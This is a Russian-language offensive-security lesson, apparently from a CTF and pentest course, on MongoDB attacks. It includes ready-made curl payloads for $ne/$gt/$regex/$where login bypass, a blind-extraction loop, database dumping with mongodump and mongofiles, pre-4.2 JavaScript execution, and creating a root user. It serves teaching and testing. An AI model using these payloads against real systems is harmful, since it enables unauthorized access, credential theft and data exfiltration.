---
id: db-mongodb
title: "MongoDB: операторная инъекция, JS и дамп базы"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 1
tags: [nosql, mongodb, injection, where, regex, mapreduce, mongosh, gridfs]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 50
summary: "MongoDB от фингерпринта до RCE: анонимный доступ на 27017, операторная инъекция ($ne/$gt/$regex/$where), blind-извлечение, JS-выполнение и дамп через mongosh."
---

MongoDB — самая популярная NoSQL-база в вебе (Node.js/Express, MEAN-стек, мобильные бэкенды). Вместо SQL она принимает **документ-запрос** — обычно JSON прямо из тела запроса. Если приложение не типизирует вход, вы подставляете **оператор** (`$ne`, `$gt`, `$regex`, `$where`) и меняете логику запроса: обходите логин, извлекаете данные посимвольно, а на старых версиях исполняете JavaScript на сервере. Отдельная ветка атаки — **открытый порт 27017** без аутентификации: тогда вся база читается клиентом напрямую.

## Фингерпринт, порт и версия

MongoDB по умолчанию слушает **27017** (wire-протокол) и иногда **28017** (старый HTTP-интерфейс). HTTP-порт отвечает характерной строкой:

```bash
curl -s http://target:28017/ | head
# It looks like you are trying to access MongoDB over HTTP on the native driver port.
nmap -sV -p 27017,28017 target
# 27017/tcp open  mongodb  MongoDB 4.4.6
```

В приложении MongoDB угадывается по косвенным признакам: ошибки вида `MongoError`, `E11000 duplicate key error`, `CastError`, стектрейсы `node_modules/mongodb`, поля `_id` с `ObjectId("...")` в JSON-ответах, `$oid` в выгрузках.

```bash
# определить, что бэкенд — Mongo, по ответу API
curl -s https://target/api/items | grep -oE '"_id":"[a-f0-9]{24}"'
# ObjectId = 24 hex-символа
```

## Анонимный доступ и клиентские инструменты

Исторически MongoDB не требовала аутентификации. Если порт открыт и `--auth` не включён, вы подключаетесь и читаете всё.

```bash
# современный шелл
mongosh "mongodb://target:27017" --eval 'db.getMongo().getDBNames()'
# легаси-клиент
mongo target:27017 --eval 'show dbs'
# с логином/паролем
mongosh "mongodb://user:pass@target:27017/?authSource=admin"

# выгрузить всю базу (без auth, если открыто)
mongodump --host target --port 27017 --out ./dump
mongodump --uri "mongodb://target:27017" --db appdb --out ./dump

# восстановить локально для анализа
mongorestore --db appdb ./dump/appdb
```

Полезные команды внутри `mongosh`:

| Команда | Что делает |
|---------|-----------|
| `show dbs` | список баз |
| `use appdb` | выбрать базу |
| `show collections` | список коллекций |
| `db.users.find().pretty()` | первые документы |
| `db.users.countDocuments()` | число документов |
| `db.users.find({role:"admin"})` | фильтр по полю |
| `db.system.version.find()` | версия (legacy) |
| `db.serverStatus().version` | версия сервера |

## Операторная инъекция: $ne, $gt, $in, $exists

Если приложение делает `db.users.findOne({username: req.body.username, password: req.body.password})`, а `req.body.password` — это **объект** (а не строка), вы подставляете оператор.

| Оператор | Смысл | Пример значения |
|----------|-------|-----------------|
| `$ne` | не равно | `{"$ne": null}` |
| `$gt` | больше | `{"$gt": ""}` |
| `$gte` / `$lt` / `$lte` | сравнения | `{"$gte": ""}` |
| `$in` | входит в список | `{"$in": ["admin","root"]}` |
| `$exists` | поле существует | `{"$exists": true}` |
| `$regex` | регулярка | `{"$regex": "^a"}` |
| `$where` | JS-предикат | `"this.password.length>0"` |

Обход логина:

```bash
# тело как JSON — подставляем объект вместо строки
curl -s -X POST https://target/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"x"}}'

# вариант: и логин, и пароль операторами
curl -s -X POST https://target/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# $gt с пустой строкой — тоже истина для любой непустой строки
-d '{"username":"admin","password":{"$gt":""}}'
```

`$ne: "x"` означает «пароль НЕ равен x» — условие истинно для настоящего пароля, и логин проходит. То же даёт `$gt: ""` («пароль больше пустой строки»).

## Инъекция в JSON, form и URL

Формат тела определяет синтаксис payload.

**JSON** (`Content-Type: application/json`) — вложенный объект:

```bash
curl -s -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":"x"}}'
```

**Form-urlencoded** — скобочная нотация (парсер `qs` в Express разворачивает её в объект):

```bash
curl -s -X POST https://target/api/login \
  -d 'user=admin&pass[$ne]=x'
# превращается в {user:"admin", pass:{$ne:"x"}}
```

**URL-параметры** (query):

```bash
curl -s 'https://target/api/user?name=admin&token[$ne]=x'
# экранирование: %5B %5D вместо [ ]
curl -s 'https://target/api/user?name=admin&token%5B%24ne%5D=x'
```

Если `$` фильтруется WAF'ом, попробуйте `%24` или обход через вложенный `$regex`. В legacy-фреймворках иногда проходит и `{$where: "..."}`.

## Blind через $regex

Когда ответ не содержит данных, но отличается по «успех/неуспех» или по времени — извлекаем значения **посимвольно** регуляркой `$regex`. Это аналог boolean-blind в SQL.

```bash
# пароль начинается на 'a'?  (по коду/длине ответа отличаем истину)
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X POST https://target/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# перебор символов
for c in a b c d e f 0 1 2 3; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}")
  echo "$c -> $code"
done
```

После каждого совпадения дописываем символ к префиксу и ищем следующий. Полный алфавит + якорь `^` дают полный пароль/токен. Тот же приём вытаскивает значения полей из любых документов: `{"field":{"$regex":"^sec"}}`.

## $where и выполнение JavaScript

`$where` принимает **строку с JavaScript**, которая вычисляется для каждого документа. Это одновременно инъекция и потенциальный RCE.

```bash
# логин-обход через $where (всегда истина)
curl -s -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$where":"1==1"}}'

# boolean-blind через задержку JS
curl -s -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$where":"if(this.password.length>5){sleep(3000);return true;}return false;"}}'

# извлечение через regex внутри $where
-d '{"$where":"this.username==\"admin\" && /^a/.test(this.password)"}'
```

`sleep(ms)` в MongoDB доступен только если включён `db.eval`/серверный JS (старые версии). На MongoDB 4.2+ `$where` остаётся, но `db.eval` удалён.

## Дамп данных: коллекции, документы, GridFS

Сначала карта, потом содержимое.

```javascript
// список баз и коллекций
show dbs
use appdb
show collections

// схема-набросок: какие поля есть у документов
db.users.aggregate([{$sample:{size:1}}]).pretty()

// дамп коллекции
db.users.find().pretty()
db.users.find({role:"admin"},{username:1,password:1}).pretty()

// только имена полей
Object.keys(db.users.findOne())

// поиск чувствительных полей по всем коллекциям
db.getCollectionNames().forEach(function(c){
  print("== " + c);
  db[c].find({},{password:1,token:1,secret:1,apiKey:1}).limit(5).forEach(printjson);
});
```

Через CLI (без `mongosh`):

```bash
mongosh "mongodb://target:27017" --eval 'db.users.find().toArray()' appdb
mongodump --uri "mongodb://target:27017/appdb" --out ./dump
```

**GridFS** — файловое хранилище Mongo (коллекции `fs.files` и `fs.chunks`). Полезно для поиска бэкапов/секретов:

```bash
mongofiles -h target --db appdb list
mongofiles -h target --db appdb get 'backup.zip'
```

## RCE: mapReduce и серверный JS

До MongoDB 4.2 `db.eval()` и `mapReduce` исполняли JS на сервере, а через хитрый `this`/`Function` можно было дотянуться до системных вызовов (`db.runCommand({eval: ...})`, `mapReduce` c вредоносной `finalize`). На уязвимых версиях это даёт RCE.

```javascript
// db.eval — версии < 4.2
db.eval("return 1+1");

// mapReduce с JS, который тянет окружение
db.users.mapReduce(
  function(){ emit(1, 1); },
  function(k,v){ return Array.sum(v); },
  { out: { inline: 1 }, finalize: function(k,v){ return v; } }
);
```

Практический чек версии и наличия JS-движка:

```javascript
db.serverStatus().version          // < 4.2 -> db.eval доступен
db.serverStatus().javascriptEngine // "mozjs" (старый) / "none"
```

На современных версиях RCE через JS нет — переходите к дампу и поиску секретов/кредов, а оттуда к латеральному движению. Если включён HTTP-интерфейс (`28017`) и открыт `--rest`, некоторые версии позволяли читать состояние сервера и запускать команды.

## Разобранный пример: обход логина и дамп

Цель: `https://shop.local/api/login` (Node/Express + MongoDB).

```bash
# Шаг 1. Пробуем обычный логин -> 401
curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"test"}'
# {"error":"invalid credentials"}

# Шаг 2. Подставляем оператор $ne -> 200 + JWT
curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":"x"}}'
# {"token":"eyJhbGci...","user":{"role":"admin"}}

# Шаг 3. Используем токен, находим ещё эндпоинты
curl -s https://shop.local/api/users -H "Authorization: Bearer eyJhbGci..."

# Шаг 4. Blind-извлечение пароля другого админа через $regex
for c in a b c d 0 1 2 3; do
  curl -s -o /dev/null -w "$c:%{http_code}\n" -X POST https://shop.local/api/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"root\",\"password\":{\"\$regex\":\"^$c\"}}"
done
# один символ даёт 200 -> префикс найден, продолжаем

# Шаг 5. Если 27017 открыт — прямой дамп
mongosh "mongodb://shop.local:27017" --eval 'db.getMongo().getDBNames()'
mongodump --host shop.local --out ./dump && grep -ri "password" ./dump | head
```

Шаг 2 — ядро: JSON-тело приняло объект, и `$ne` сделал условие истинным для любого настоящего пароля.

## Частые ошибки

- **Строка вместо объекта.** `password: {"$ne":"x"}` — это JSON-объект; в form-urlencoded нужна скобочная нотация `pass[$ne]=x`, иначе прилетит строка `[object Object]` или 400.
- **Забыть `Content-Type: application/json`.** Без него Express не распарсит вложенный объект и оператор не сработает.
- **Путать `$ne` и `$gt`.** Оба обходят логин, но `$gt:""` требует, чтобы поле было строкой; `$ne` — универсальнее.
- **Ждать `$where` на современной версии.** `$where` работает, но `sleep()`/`db.eval` удалены в 4.2+ — не строите time-blind на JS там, где его нет.
- **Игнорировать `ObjectId`.** `_id` — не число и не строка; в JSON API он приходит как 24-hex, в Mongo — как `ObjectId(...)`; при инъекции не подставляйте `_id` как int.
- **Дамп без сортировки/лимита.** `find()` на большой коллекции повесит сессию; используйте `limit`/`skip` и `countDocuments()` заранее.
- **Ломать продакшн.** `mongodump` читает без изменений, но `db.dropDatabase()`/`deleteMany` — разрушительны; не выполняйте их без согласования.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, инъекционные пейлоады, JS/RCE и работа с пользователями/ролями.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `db.version()` | версия сервера | `mongosh ... --eval 'db.version()'` → `6.0.5` |
| `db.serverStatus().version` | версия из статуса | `--eval 'db.serverStatus().version'` |
| `db.serverBuildInfo()` | сборка, OpenSSL, JS-движок | `--eval 'db.serverBuildInfo().javascriptEngine'` |
| `db.hello()` | роль узла, набор реплик | `--eval 'db.hello()'` |
| `db.adminCommand({buildInfo:1})` | версия/сборка | |
| `db.getMongo().getDBNames()` | список баз | `--eval 'db.getMongo().getDBNames()'` |
| `db.runCommand({ping:1})` | проверка связи | → `{ ok: 1 }` |
| HTTP `:28017` | старый REST-интерфейс | `curl -s http://target:28017/` → `It looks like you are trying to access MongoDB over HTTP...` |
| Ошибки | `MongoError`, `E11000 duplicate key`, `CastError` | |
| ObjectId | 24 hex в JSON | `grep -oE '"_id":"[a-f0-9]{24}"'` |

### (б) Клиентские инструменты

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `mongosh "mongodb://host:27017"` | современный шелл | `mongosh "mongodb://target:27017"` |
| `mongosh ... --eval 'JS'` | выполнить JS и выйти | `--eval 'db.getMongo().getDBNames()'` |
| `--quiet` | без баннера | `mongosh --quiet ...` |
| `--file script.js` | выполнить файл | `mongosh ... --file q.js` |
| `-u U -p P --authenticationDatabase admin` | с аутентификацией | `mongosh -u root -p pass --authenticationDatabase admin` |
| `--tls` / `--ssl` | TLS | |
| `mongo host:27017` | легаси-клиент | `mongo target:27017 --eval 'show dbs'` |
| `mongodump -h host --port 27017 --out ./dump` | выгрузить всю базу | `mongodump --host target --out ./dump` |
| `mongodump --uri "..." --db appdb --collection users` | выгрузить коллекцию | |
| `mongodump --gzip --archive=out.gz` | сжатый архив | |
| `mongorestore --db appdb ./dump/appdb` | восстановить | |
| `mongoexport -d appdb -c users -f u,p --type=json -o u.json` | экспорт коллекции | |
| `mongoexport -q '{"role":"admin"}'` | экспорт с фильтром | |
| `mongoimport -d appdb -c users --file u.json` | импорт | |
| `mongofiles -h host -d appdb list` | список GridFS | `mongofiles -h target --db appdb list` |
| `mongofiles -h host -d appdb get backup.zip` | скачать файл из GridFS | |
| `bsondump dump/appdb/users.bson` | читаемый BSON→JSON | |

### (в) Инъекционные пейлоады

| Пейлоад | Что делает | Пример |
|---------|-----------|--------|
| `{"$ne":null}` | «не равно null» — обход логина | `-d '{"username":"admin","password":{"$ne":"x"}}'` |
| `{"$gt":""}` | «больше пустой строки» — истина | `-d '{"password":{"$gt":""}}'` |
| `{"$gte":""}` / `{"$lt":...}` | сравнения | `{"token":{"$gte":""}}` |
| `{"$in":["admin","root"]}` | вхождение в список | `{"user":{"$in":["admin","root"]}}` |
| `{"$exists":true}` | поле существует | `{"resetToken":{"$exists":true}}` |
| `{"$regex":"^a"}` | префикс (blind) | `{"password":{"$regex":"^a"}}` |
| `{"$where":"1==1"}` | JS-предикат (обход логина) | `{"password":{"$where":"1==1"}}` |
| `{"$where":"this.p.length>5"}` | JS-blind | |
| Form-нотация | `pass[$ne]=x` | `-d 'user=admin&pass[$ne]=x'` |
| URL-нотация | `token[$ne]=x` / `%24` | `?name=admin&token%5B%24ne%5D=x` |
| `$or` | логическое расширение | `{"$or":[{},{"user":"admin"}]}` |
| `$regex` + `$where` | комбинированный blind | `{"$where":"/^a/.test(this.password)"}` |

### (г) JS-выполнение, дамп и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `db.users.find().pretty()` | дамп коллекции | `--eval 'db.users.find().toArray()'` |
| `db.users.countDocuments()` | число документов | |
| `db.getCollectionNames()` | список коллекций | |
| `db.system.users.find()` | пользователи (хэши) | `--eval 'db.system.users.find()'` |
| `db.eval("JS")` | произвольный JS (MongoDB < 4.2) → RCE | `db.eval("return 1+1")` |
| `mapReduce` с `finalize` | исполняет JS на сервере (< 4.2) | `db.users.mapReduce(f, r, {out:{inline:1}, finalize:...})` |
| `$where` + `sleep(ms)` | time-blind на старых версиях | `{"$where":"if(cond){sleep(3000);return true;}return false;"}` |
| `db.serverStatus().javascriptEngine` | есть ли JS-движок | `mozjs` / `none` |
| GridFS (`fs.files`/`fs.chunks`) | поиск бэкапов/секретов | `mongofiles -h target -d appdb list` |
| `--rest` HTTP-интерфейс | старый REST-доступ | `curl http://target:28017/_status` |
| `db.runCommand({eval:...})` | eval через команду (< 4.2) | |
| `load('script.js')` | серверный JS (< 4.2) | |

### (д) Пользователи, роли, привилегии

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `db.getUsers()` | пользователи текущей БД | `--eval 'db.getUsers()'` |
| `db.getRoles({showPrivileges:true})` | роли и их права | |
| `db.runCommand({connectionStatus:1})` | кто я, мои роли | `--eval 'db.runCommand({connectionStatus:1})'` |
| `db.adminCommand({usersInfo:1, showPrivileges:true})` | все пользователи + права | |
| `db.adminCommand({listDatabases:1})` | список баз | |
| `db.system.users.find()` | документы пользователей | |
| `db.createUser({user,pwd,roles})` | создать пользователя | `db.createUser({user:'x',pwd:'p',roles:[{role:'root',db:'admin'}]})` |
| `db.grantRolesToUser('x',[{role:'root',db:'admin'}])` | повысить права | |
| `db.updateUser('x',{pwd:'p'})` | сменить пароль | |
| `db.adminCommand({getParameter:1, authenticationMechanisms:1})` | включена ли аутентификация | |
| `db.runCommand({dropDatabase:1})` | **разрушительно** — не выполнять без согласования | |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какое значение поля password в JSON обходит проверку логина в MongoDB?"
  options:
    - "' OR 1=1 --"
    - '{"$ne":"x"}'
    - "UNION SELECT NULL"
    - "' OR '1'='1"
  answer: 1
  explanation: "Оператор $ne (не равно) делает условие истинным для любого настоящего пароля."
- question: "Как записать операторную инъекцию в application/x-www-form-urlencoded?"
  options:
    - "pass=$ne:x"
    - "pass[$ne]=x"
    - 'pass={"$ne":"x"}'
    - "pass%3Dne"
  answer: 1
  explanation: 'Скобочная нотация разворачивается парсером qs в объект {pass:{$ne:"x"}}.'
- question: "Каким оператором MongoDB делают blind-извлечение посимвольно?"
  options:
    - "LIKE"
    - "$regex"
    - "SUBSTRING"
    - "MATCH"
  answer: 1
  explanation: "$regex с якорем ^ проверяет префикс и даёт boolean-сигнал."
- question: "Что выполняет JavaScript на сервере MongoDB в старых версиях?"
  options:
    - "UNION"
    - "$where и db.eval"
    - "CONFIG SET"
    - "Cypher"
  answer: 1
  explanation: "$where вычисляет JS-предикат; db.eval (до 4.2) исполнял произвольный JS."
- question: "Какая утилита выгружает всю базу MongoDB снаружи?"
  options:
    - "redis-cli"
    - "mongodump"
    - "pg_dump"
    - "cqlsh"
  answer: 1
  explanation: "mongodump подключается по wire-протоколу и сохраняет коллекции в BSON."
```

## Где пригодится

- **CTF (Web):** задачи на MongoDB — это почти всегда `$ne` в логине и `$regex` для слепого дампа; определять их нужно мгновенно.
- **Bug bounty:** NoSQL-инъекция в API — высокооплачиваемая находка; подтверждение дампом делает отчёт бесспорным.
- **Пентест:** открытый 27017 = полная утечка базы; умение дампить через `mongosh`/`mongodump` обязательно.
- **Работа (AppSec):** знание операторов и `$where` ложится в правила валидации входа и ревью кода на Node.js-бэкендах.
